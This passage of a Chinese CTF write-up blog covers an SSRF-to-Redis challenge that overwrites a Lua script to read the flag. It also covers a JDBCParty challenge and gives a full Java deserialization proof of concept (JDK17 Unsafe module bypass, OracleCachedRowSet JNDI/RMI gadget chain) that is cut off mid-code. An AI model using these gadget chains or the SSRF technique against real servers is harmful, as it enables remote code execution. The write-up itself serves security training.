class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_file</span><span class="params">(filename)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> file <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error: Could not open file &quot;</span> .. filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> content = file:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line"></span><br><span class="line">file:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_lua_code</span><span class="params">(script_content)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> lua_code = script_content:<span class="built_in">match</span>(<span class="string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lua_code <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> chunk, err = <span class="built_in">load</span>(lua_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> success, result = <span class="built_in">pcall</span>(chunk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> success <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error executing Lua code: &quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error loading Lua code: &quot;</span>, err)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error: No valid Lua code block found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> filename = <span class="string">&quot;/scripts/visit.script&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> script_content = read_file(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> script_content <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">execute_lua_code(script_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>scripts文件夹下的文件 visit.script</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line"><span class="keyword">local</span> curl = <span class="built_in">require</span>(<span class="string">&quot;cURL&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span>(<span class="string">&quot;resty.redis&quot;</span>)</span><br><span class="line"></span><br><span class="line">ngx.req.read_body()</span><br><span class="line"><span class="keyword">local</span> args = ngx.req.get_uri_args()</span><br><span class="line"><span class="keyword">local</span> url = args.url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;URL parameter is missing!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> red = redis:new()</span><br><span class="line">red:set_timeout(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to connect to Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> res, err = red:get(url)</span><br><span class="line"><span class="keyword">if</span> res <span class="keyword">and</span> res ~= ngx.null <span class="keyword">then</span></span><br><span class="line">    ngx.say(res)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> c = curl.easy &#123;</span><br><span class="line">    url = url,</span><br><span class="line">    timeout = <span class="number">5</span>,</span><br><span class="line">    connecttimeout = <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response_body = &#123;&#125;</span><br><span class="line"></span><br><span class="line">c:setopt_writefunction(<span class="built_in">table</span>.<span class="built_in">insert</span>, response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = <span class="built_in">pcall</span>(c.perform, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to perform request: &quot;</span>, err)</span><br><span class="line">    c:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">c:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response_str = <span class="built_in">table</span>.<span class="built_in">concat</span>(response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:setex(url, <span class="number">3600</span>, response_str)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to save response in Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">ngx.say(response_str)</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure><p>这里没学过lua没明白啥意思丢个gpt问了问这个脚本是什么意思就是相当于是本地开了一个redis服务，然后curl可以发起请求连接这个redis服务也可以访问http将返回的值存入redis中。其实本质就是一个ssrf打redis。我这里直接使用dict协议去攻击redis，我的思路是去覆盖visit.script文件，因为main.lua功能主要是读取visit.script中的代码去执行的。</p><img src="/post/e5e27309/IMAGE20250106122446596.png" class=""><img src="/post/e5e27309/IMAGE20250106122525393.png" class=""><img src="/post/e5e27309/IMAGE20250106122635128.png" class=""><img src="/post/e5e27309/IMAGE20250106122659874.png" class=""><p>这里的16进制代码是</p><img src="/post/e5e27309/IMAGE20250106122734510.png" class=""><p>然后直接save就可以了</p><img src="/post/e5e27309/IMAGE20250106122819523.png" class=""><p>在访问下visit路由就可以看到flag了</p><img src="/post/e5e27309/IMAGE20250106122809730.png" class=""><p>当时比赛没打出来原因是自己和队友一直想着去覆盖执行命令去了忘了使用这里的readflag，但是执行命令的代码有点长在redis传输过程中会有一些脏数据插入到里面所以导致一直覆盖的代码是有问题的。</p><p><a href="9c546db896fcd97d4c84f7fcf99357a3attachment_20250102085620033.zip">题目附件</a></p><h2 id="JDBCParty">JDBCParty</h2><p>题目给了一个jar包反编译看看</p><img src="/post/e5e27309/IMAGE20250221202559154.png" class=""><p>看路由可以看到存在一个直接的反序列化点。去看看依赖</p><img src="/post/e5e27309/IMAGE20250221202740610.png" class=""><p>可以看到这些依赖像是去利用jndi，但是这里的jdk版本是17所以需要bypass。这里利用的是com.oracle.database.jdbc这个依赖实际上就是以下这个项目介绍的漏洞</p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><img src="/post/e5e27309/IMAGE20250221203102746.png" class=""><p>或者参考该文章也有介绍<br><a href="https://xz.aliyun.com/news/14169">https://xz.aliyun.com/news/14169</a></p><p>为什么需要rmi打呢</p><img src="/post/e5e27309/IMAGE20250221212153424.png" class=""><img src="/post/e5e27309/IMAGE20250221212218298.png" class=""><p>这两个会报错。</p><h3 id="jdk17-反射利用">jdk17 反射利用</h3><p>可以参考这两个师傅写的总结的很全面<br><a href="https://forum.butian.net/share/3748">https://forum.butian.net/share/3748</a><br><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">https://pankas.top/2023/12/05/jdk17-反射限制绕过/</a></p><p>来看一下其他师傅们的打法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;    </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;    </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;    </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;    </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.users.MemoryUserDatabaseFactory;    </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;    </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;    </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;    </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;    </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;    </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;    </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;    </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;    </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;    </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">    </span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);    </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);    </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);    </span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();    </span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> poc.class;    </span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));    </span><br><span class="line">        unsafe.getAndSetObject(currentClass, addr, baseModule);    </span><br><span class="line">        <span class="type">OracleCachedRowSet</span> <span class="variable">oracleCachedRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OracleCachedRowSet</span>();    </span><br><span class="line">    </span><br><span class="line">        oracleCachedRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);    </span><br><span class="line">    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;monitorLock&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();    </span><br><span class="line">        vector1.add(<span class="number">0</span>,<span class="string">&quot;111&quot;</span>);    </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();    </span><br><span class="line">        vector2.add(<span class="number">0</span>,<span class="string">&quot;222&quot;</span>);    </span><br><span class="line">        String[] metaData= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>&#125;;    </span><br><span class="line">    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(oracleCachedRowSet);    </span><br><span class="line">    </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();    </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();    </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);    </span><br><span class="line">        vector.add(pojoNode);    </span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);    </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> base64Encode(serialize(list));    </span><br><span class="line">        System.out.println(payload);    </span><br><span class="line">        deserialize(base64Decode(payload));    </span><br><span class="line">    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;    </span><br><span class="line">        <span class="keyword">try</span> &#123;    </span><br><span class="line">            field = clazz.getDeclaredField(fieldName);    </span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);    </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;    </span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;    </span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> field;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;    </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();    </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;    </span><br><span class="line">            <span class="keyword">try</span> &#123;    </span><br><span class="line">                field = c.getDeclaredField(fieldName);    </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;    </span><br><span class="line">                c = c.getSuperclass();    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);    </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);    </span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);    </span><br><span class="line">        dField.set(obj, val);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">//HashMap打Spring的原生toString链    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();    </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);    </span><br><span class="line">        Class&lt;?&gt; nodeC;    </span><br><span class="line">        <span class="keyword">try</span> &#123;    </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;    </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);    </span><br><span class="line">        &#125;    </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);    </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);    </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));    </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));    </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);    </span><br><span class="line">        <span class="keyword">return</span> s;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String base64) &#123;    </span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">decoder</span> <span class="operator">=</span> Base64.getDecoder();    </span><br><span class="line">        <span class="keyword">return</span> decoder.decode(base64);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;    </span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();    </span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();    </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);    </span><br><span class="line">        objOut.writeObject(obj);    </span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);    </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);    </span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();    </span><br><span class="line">    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbcparty;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSafeTools</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Unsafe unsafe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnSafeTools</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        unsafe = (Unsafe)field.get((Object)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object o, Field field, Object value)</span> &#123;</span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newClass</span><span class="params">(Class c)</span> <span class="keyword">throws</span> 